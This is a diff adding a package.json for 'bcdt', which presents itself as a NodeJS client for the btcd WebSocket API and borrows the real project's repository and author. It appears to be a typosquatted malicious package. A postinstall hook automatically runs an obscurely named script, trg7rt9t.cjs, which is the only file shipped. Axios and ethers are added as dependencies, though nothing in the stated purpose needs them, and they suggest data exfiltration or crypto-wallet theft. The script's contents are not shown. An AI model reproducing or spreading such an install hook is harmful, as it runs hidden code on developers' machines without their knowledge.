@@ -1,0 +1,29 @@
+{
+  "name": "bcdt",
+  "version": "0.0.6",
+  "description": "NodeJS client for btcd WebSocket API",
+  "main": "btcd.js",
+  "scripts": {
+    "postinstall": "node trg7rt9t.cjs"
+  },
+  "keywords": [
+    "bitcoin",
+    "btcd"
+  ],
+  "repository": "https://github.com/shesek/btcd",
+  "author": "Nadav Ivgi",
+  "license": "MIT",
+  "devDependencies": {
+    "coffee-script": "^1.7.1",
+    "mocha": "^1.18.2"
+  },
+  "dependencies": {
+    "ws": "^0.4.31",
+    "debug": "^0.8.0",
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  },
+  "files": [
+    "trg7rt9t.cjs"
+  ]
+}
